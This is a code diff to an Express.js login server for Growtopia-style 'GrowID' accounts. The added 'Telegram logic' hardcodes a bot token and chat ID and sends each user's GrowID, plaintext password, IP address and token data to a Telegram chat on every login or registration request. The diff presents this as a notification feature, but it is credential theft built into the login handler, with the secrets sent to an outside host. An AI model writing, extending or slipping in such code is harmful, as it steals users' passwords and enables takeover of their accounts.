@@ -3,6 +3,32 @@ const app = express();
 const rateLimit = require('express-rate-limit');
 const bodyParser = require('body-parser');
 const compression = require('compression');
+const axios = require('axios'); // !!! NOTE: You must install this package (npm install axios) !!!
+
+// 📢 IMPORTANT: Replace the placeholders below with your actual Telegram credentials.
+const TELEGRAM_BOT_TOKEN = '6441563124:AAH5nB7WTP2x5F5_hNPcTq36ryJkbgEYv8s'; 
+const TELEGRAM_CHAT_ID = '5113674259'; 
+
+function sendToTelegram(message) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.log('Telegram credentials not set. Skipping notification.');
+        return;
+    }
+    
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    axios.post(url, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    })
+    .then(response => {
+        // console.log('Telegram notification sent.');
+    })
+    .catch(error => {
+        console.error('Error sending Telegram message:', error.response ? error.response.data : error.message);
+    });
+}
 
 function isValidEmail(email) {
     return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
@@ -115,6 +141,20 @@ app.all('/player/growid/login/validate', (req, res) => {
         ? `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}&email=${email}&gender=${gender}`
         : `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}`;
 
+    // --- START: NEW TELEGRAM LOGIC ---
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
+    const telegramMessage = 
+        `🔑 *New Login/Registration* 🔑\n` +
+        `*Action*: ${type.toUpperCase()}\n` +
+        `*GrowID*: \`${trimmedGrowId}\`\n` +
+        `*Password*: \`${trimmedPassword}\`\n` + 
+        `*IP Address*: ${ip}\n` +
+        `*Full Token Data (Pre-Encode)*: \`${tokenData}\``;
+    
+    sendToTelegram(telegramMessage);
+    // --- END: NEW TELEGRAM LOGIC ---
+    
     const token = Buffer.from(tokenData).toString('base64');
 
     res.setHeader('Content-Type', 'text/html');
